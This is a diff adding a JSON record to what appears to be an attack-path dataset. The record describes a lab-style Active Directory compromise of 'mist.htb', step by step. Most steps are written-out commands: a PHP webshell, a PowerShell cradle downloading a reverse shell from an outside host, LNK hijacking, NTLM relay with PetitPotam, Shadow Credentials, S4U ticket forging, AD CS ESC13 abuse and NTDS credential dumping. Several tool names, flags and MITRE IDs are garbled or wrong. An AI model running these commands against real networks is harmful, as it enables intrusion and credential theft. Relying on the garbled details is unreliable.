@@ -1,0 +1,171 @@
+{
+  "id": "ap-0034",
+  "title": "AD Compromise: Pluck RCE, LNK Hijack, NTLM Relay, Shadow Credentials, and AD CS ESC13 Chain",
+  "summary": "Multi-vector attack starting with authenticated Remote Code Execution (RCE) via Pluck CMS, followed by user session hijacking using LNK files, complex NTLM relay combined with Shadow Credentials coercion (PetitPotam) against a machine account, and an Active Directory Certificate Services (AD CS) ESC13 chain leading to Backup Operator privileges and eventual Domain Controller NTDS dump.",
+  "attack_path_markdown": "### Step 1\nExploit Pluck CMS file disclosure and authenticated RCE to gain an initial shell as SVC_web.\n### Step 2\nHijack a higher privilege user session (brandon.keywarp) using a malicious LNK file.\n### Step 3\nSet up tunneling, obtain domain user hash (ESC1), and perform NTLM Relay/Shadow Credentials against MS01$ machine account.\n### Step 4\nUse S4U ticket forging to impersonate Administrator and dump local machine credentials, gaining access to operative user's KeyPass database.\n### Step 5\nExecute the AD CS ESC13 attack chain via the SVC_CA$ GMSA and Certificate Manager privileges, leading to Backup Operator group membership and NTDS dump.",
+  "kill_chain": [
+    {
+      "phase_order": 1,
+      "phase_name": "Reconnaissance",
+      "description": "Identifying the target environment, exposed services, software versioning, and initial potential vulnerabilities.",
+      "actions": [
+        "Perform comprehensive port scan on the target IP (10.10.11.17).",
+        "Identify Apache web server running on Windows with PHP enabled (TTL 126/127 indicates a VM) .",
+        "Identify Pluck CMS version 4.7.18 .",
+        "Search for known vulnerabilities (CVEs) related to Pluck 4.7.18, focusing on file disclosure .",
+        "Exploit file disclosure vulnerability in `get_image.php` to access `admin_backup.PHP`.",
+        "Download `admin_backup.PHP` content to obtain a hashed password.",
+        "Crack the SHA-512 hash (`wc -c 128` confirms length) using Crack Station, recovering the password 'lexipoo997' ."
+      ],
+      "tools": ["Nmap", "Curl", "Google/CVE search", "Crack Station"],
+      "techniques": ["T1595.002 (Active Scanning)", "T1592 (Gather Victim Information)", "T1558.001 (File Disclosure)"],
+      "mitre_ids": ["T1595.002", "T1592", "T1558.001"],
+      "indicators": ["HTTP on Port 80", "Pluck 4.7.18 banner", "SHA-512 hash"],
+      "preconditions": "Network connectivity to target.",
+      "expected_outcome": "Valid credentials ('admin':'lexipoo997').",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 2,
+      "phase_name": "Weaponization",
+      "description": "Preparing the necessary payloads and files for exploitation.",
+      "actions": [
+        "Create a PHP webshell payload (`shell.PHP`) using the command execution function: `<?php system($_GET['CMD']); ?>` .",
+        "Package the webshell into a directory and zip file required for module installation: `mkdir shell; mv shell.PHP shell; zip -r shell.zip shell` .",
+        "Prepare an encoded Powershell reverse shell payload (`rev.PS1`) and host it [10, 11].",
+        "Create a web cradle mechanism for deployment (to detect AV interference): `IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.8:8000/rev.PS1')` .",
+        "Encode the cradle command for PowerShell execution: `IEX ...` using Base64/UTF-16LE encoding: `IEX (IConvert::ToUTF16LEBase64)` (implied encoding process) ."
+      ],
+      "tools": ["PHP code editor", "Zip utility", "PowerShell `IEX` command"],
+      "techniques": ["T1027 (Obfuscated Files or Information)", "T1059.001 (PowerShell)"],
+      "mitre_ids": ["T1027", "T1059.001"],
+      "indicators": ["Base64 encoded shell script", "Zipped module `shell.zip`"],
+      "preconditions": "Cracked admin credentials.",
+      "expected_outcome": "Ready-to-deploy reverse shell payload.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 3,
+      "phase_name": "Delivery",
+      "description": "Sending the webshell payload to the target system via authenticated upload.",
+      "actions": [
+        "Authenticate to Pluck CMS using 'admin':'lexipoo997' .",
+        "Upload the `shell.zip` via the 'Install Module' function ."
+      ],
+      "tools": ["Web browser/Curl"],
+      "techniques": ["T1105 (Ingress Tool Transfer)"],
+      "mitre_ids": ["T1105"],
+      "indicators": ["Successful module installation message (Module has been installed successfully) "],
+      "preconditions": "Admin user credentials.",
+      "expected_outcome": "Webshell installed in the server's data directory.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 4,
+      "phase_name": "Exploitation",
+      "description": "Executing the uploaded shell and compromising a higher privileged domain user account on the same host using a poisoned shortcut.",
+      "actions": [
+        "Execute the PHP shell via HTTP request: `http://10.10.11.17/data/modules/shell/shell.PHP?CMD=whoami` .",
+        "Launch the encoded Powershell reverse shell from the webshell, gaining initial access as `SVC web` user .",
+        "Check for AV exclusions by querying Windows Defender logs (Event ID 5057) which reveals `xampp\\HD docs` is excluded .",
+        "Identify shared LNK files in `C:\\common applications` that the `SVC web` user can write to .",
+        "Set up listener for the next stage shell: `nc -lvmp 9001` .",
+        "Modify the `calculator.lnk` shortcut to execute a malicious Powershell payload .",
+        "The LNK modification commands involve using COM objects: `$objShell = New-Object -ComObject WScript.Shell` .",
+        "Create shortcut object: `$lnk = $objShell.CreateShortcut('C:\\common applications\\calculator.lnk')` .",
+        "Set target to Powershell: `$lnk.TargetPath = 'powershell.exe'` .",
+        "Set arguments to run the encoded cradle payload: `$lnk.Arguments = '-D [Encoded Command]'` .",
+        "Save the malicious link: `$lnk.Save()` .",
+        "Wait for user interaction (click on the hijacked calculator shortcut) ."
+      ],
+      "tools": ["Webshell endpoint", "NC listener", "PowerShell", "Get-WinEvent (Event ID 5057)", "WScript.Shell COM Object"],
+      "techniques": ["T1505.003 (Web Shell)", "T1059.001 (PowerShell)", "T1547.001 (Shortcut Modification)"],
+      "mitre_ids": ["T1505.003", "T1547.001"],
+      "indicators": ["Reverse shell callback from `SVC web` user", "New shell callback from `brandon.keywarp` user "],
+      "preconditions": "Vulnerable module upload functionality, user interaction (LNK click).",
+      "expected_outcome": "Shell access as `brandon.keywarp` (Domain User).",
+      "confidence": 0.9
+    },
+    {
+      "phase_order": 5,
+      "phase_name": "Installation",
+      "description": "Establishing infrastructure for sustained remote control and lateral movement, focusing on AD enumeration and initial privilege escalation using Pass-the-Certificate.",
+      "actions": [
+        "Upload and start Chisel for SOCKS proxy: `chisel.exe client 10.10.14.8:8001 R:SOCKS` ",
+        "Enumerate internal network via proxy: `proxychains nxc SMB 192.168.100.100` (identifying DC01)].",
+        "Enumerate domain name and hostnames: `ping mist.htb`, `ipconfig` .",
+        "Run SharpHound to map AD structure: `sharphound.exe -c All` .",
+        "Identify AD CS ESC1 vulnerability for `User Authentication` template .",
+        "Transfer Certify.exe to the AV-excluded directory (`HD docs`) .",
+        "Request TGT/NTLM hash via ESC1 using Certify (Pass-the-Certificate): `certify.exe request /ca:DC01/DC01-CA /template:UserAuthentication -keysize:4096` .",
+        "Convert certificate to PFX and use Rubius to get the NTLM hash: `rubius.exe ask_tgt /user:brandon.keywarp /certificate:Brandon_key.pfx /getcreds /show /nowrap` ",
+        "Validate authentication to DC with NTLM hash: `proxychains nxc ldap 192.168.100.100 -u brandon.keywarp -H [Brandon_NTLM_Hash] --ldap-checker` (Verifying LDAP signing is disabled)."
+      ],
+      "tools": ["Chisel.exe", "SharpHound.exe", "Certify.exe", "Rubius.exe", "NXC", "OpenSSL (implied)"],
+      "techniques": ["T1090.002 (SOCKS Proxy)", "T1550.003 (Pass the Certificate)", "T1558.005 (AD CS Abuse)"],
+      "mitre_ids": ["T1090.002", "T1550.003", "T1558.005"],
+      "indicators": ["Successful SOCKS connection", "NTLM hash for `brandon.keywarp`", "LDAP signing not enforced"],
+      "preconditions": "Domain User credentials, AV exclusion access.",
+      "expected_outcome": "Ability to authenticate to AD services using hashes/tickets.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 6,
+      "phase_name": "Command and Control",
+      "description": "Executing chained attacks (NTLM Relay, Shadow Credentials, S4U) to compromise the MS01 machine account and obtain local administrator privileges.",
+      "actions": [
+        "Start Chisel forward tunnel for relay: `chisel.exe client 10.10.14.8:8001 R:5050:127.0.0.1:80` .",
+        "Set up custom Impacket NTLM Relay listener (must run as root/Port 80): `proxychains ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i --smb2support -d mist.htb`.",
+        "Start Web Client Service on MS01 (required for WebDAV coercion): Execute `ETWStartWebClient.exe` [32, 33].",
+        "Coerce authentication from machine account MS01$ (PetitPotam): `proxychains python3 petitpotam.py -u brandon.keywarp -H [Hash] ms01 192.168.100.101 -p 5050 -t 192.168.100.101 -e all`.",
+        "Interact with the LDAP shell established via relay .",
+        "Clear existing Shadow Credentials: `clearShadowCreds ms01$`.",
+        "Set new Shadow Credentials (linking a PKCS12 certificate to the machine account): `setShadowCreds ms01$`.",
+        "Retrieve MS01$ NTLM Hash using Rubius and the generated PFX/password: `rubius.exe ask_tgt /user:ms01$ /certificate:ms01.pfx /password:[PFX_PASS] /getcreds /show /nowrap` .",
+        "Perform S4U ticket forging to impersonate Administrator for the CIFS service: `rubius.exe s4u /self:ms01$ /impersonateuser:Administrator /altservice:cifs/ms01.mist.htb /ticket:[TGT_MS01$]` .",
+        "Convert Kirby ticket to CC cache: `ticketConverter.py ms01_decoded.kirby ms01.ccache` [40].",
+        "Dump local machine credentials (SAM/System hives) using the forged Administrator ticket: `export KRB5CCNAME=ms01.ccache; proxychains secretsdump.py -k -no-pass administrator@ms01.mist.htb` .",
+        "Obtain local Administrator hash and SVC web password ('123') ."
+      ],
+      "tools": ["Chisel", "Custom Impacket (ntlmrelayx.py, secretsdump.py, ticketConverter.py)", "PetitPotam/PetitePM", "ETWStartWebClient.exe", "Rubius.exe"],
+      "techniques": ["T1550.002 (NTLM Relay)", "T1558.004 (Shadow Credentials)", "T1558.003 (S4U)", "T1003.002 (OS Credential Dumping)"],
+      "mitre_ids": ["T1550.002", "T1558.004", "T1558.003", "T1003.002"],
+      "indicators": ["NTLM hash for `MS01$`", "Forged Administrator service ticket", "Local Administrator hash/password"],
+      "preconditions": "LDAP signing disabled, Web Client Service running, Custom Impacket installed.",
+      "expected_outcome": "Local Administrator access and control over MS01.",
+      "confidence": 0.95
+    },
+    {
+      "phase_order": 7,
+      "phase_name": "Actions on Objectives",
+      "description": "Achieving Domain Administrator privileges via secondary user compromise and the AD CS ESC13 escalation chain to dump NTDS.DIT.",
+      "actions": [
+        "Access `sharon.kdbx` KeyPass file via SMB share using Administrator privileges .",
+        "Crack KeyPass hash using discovered partial password and Hashcat (mode 13400): `keypass2john sharon.kdbx > mist.keypass; hashcat -A 3 -m 13400 [HASH] [PARTIAL_PASS]?a` (revealing final password) .",
+        "Log in as `op_sharon.mullard` and read the Group Managed Service Account (GMSA) password for SVC_CA$: `proxychains nxc ldap 192.168.100.100 -u op_sharon.mullard -p [Sharon_Pass] --gmsa` .",
+        "Bypass WTS restriction on SVC_CA$ (Workstation Trust Account) by linking credentials to SVC_CA_backup user using Pi-Whisker: `proxychains python3 pywhisker.py -d mist.htb -u SVC_CA$ -hashes [Hash] --target SVC_CA_backup add` .",
+        "Obtain TGT/NT hash for SVC_CA_backup using PFX file created by Pi-Whisker: `proxychains python3 getTGT.py -pfx SVC_CA_backup.pfx ...` .",
+        "Execute AD CS ESC13 (Stage 1 - Certificate Manager): `proxychains certify request -u SVC_CA_backup@Mist.HTB -hashes [Hash] /ca:mist-dc01-CA /template:'Manager Authentication' -keysize:4096` .",
+        "Execute AD CS ESC13 (Stage 2 - Backup Operator): Using the new certificate, request template 'Backup Service Authentication' .",
+        "Use Backup Operator ticket to remotely backup DC registry keys (SAM/System) via RPC/SMB: `export KRB5CCNAME=SVC_CA_backup.ccache; proxychains rpcdump.py -k -no-pass SVC_CA_backup@dc01.mist.htb -share [Attack_Share_IP]/share` (Requires setup of attacker SMB server: `sudo SMBServer.py -smb2support share /path/to/share`) .",
+        "Dump NTDS.DIT database using the Backup Operator ticket to obtain the Domain Administrator hash: `proxychains secretsdump.py -k -no-pass SVC_CA_backup@dc01.mist.htb` .",
+        "Execute commands on DC01 using the recovered Administrator hash: `proxychains wmiexec.py -hashes [Admin_NTLM] administrator@192.168.100.100` ."
+      ],
+      "tools": ["KeyPassToJohn/Hashcat", "NXC", "Pi-Whisker", "PKINIT tools (getTGT.py)", "Certify.py", "Impacket (secretsdump.py, rpcdump.py, wmiexec.py)", "SMBServer.py"],
+      "techniques": ["T1555 (Credential from files)", "T1558.005 (AD CS ESC13)", "T1003.003 (NTDS Dump)", "T1078.002 (Domain Accounts)"],
+      "mitre_ids": ["T1555", "T1558.005", "T1003.003", "T1078.002"],
+      "indicators": ["Domain Administrator NTLM hash", "Root flag retrieval."],
+      "preconditions": "Backup Operator privileges, access to DC via SOCKS proxy.",
+      "expected_outcome": "Complete Domain Compromise (Root).",
+      "confidence": 0.95
+    }
+  ],
+  "tactics": ["Initial Access", "Execution", "Persistence", "Privilege Escalation", "Credential Access", "Defense Evasion", "Lateral Movement", "Impact"],
+  "techniques": ["Web Shell", "NTLM Relay", "Shadow Credentials", "AD CS Abuse (ESC1/ESC13)", "NTDS Dump", "S4U Ticket Forging", "LNK File Hijack"],
+  "mitre_ids": ["T1505.003", "T1550.002", "T1558.004", "T1547.001", "T1558.005", "T1003.003"],
+  "hosts": ["10.10.11.17 (MS01)", "192.168.100.100 (DC01)"],
+  "privs_obtained": ["local admin (MS01)", "domain user (Brandon)", "machine account (MS01$)", "operative user (Sharon)", "GMSA account (SVC_CA$)", "backup operator", "domain administrator"],
+  "confidence": 0.95,
+  "notes": "Highly complex, multi-stage Active Directory attack relying on numerous chained vulnerabilities including an application RCE, host-based lateral movement, and several Kerberos/NTLM/AD CS abuses.",
+  "labels": ["attack_path", "adcs", "kerberos", "ntlm_relay", "shadow_creds", "web_rce"]
+}
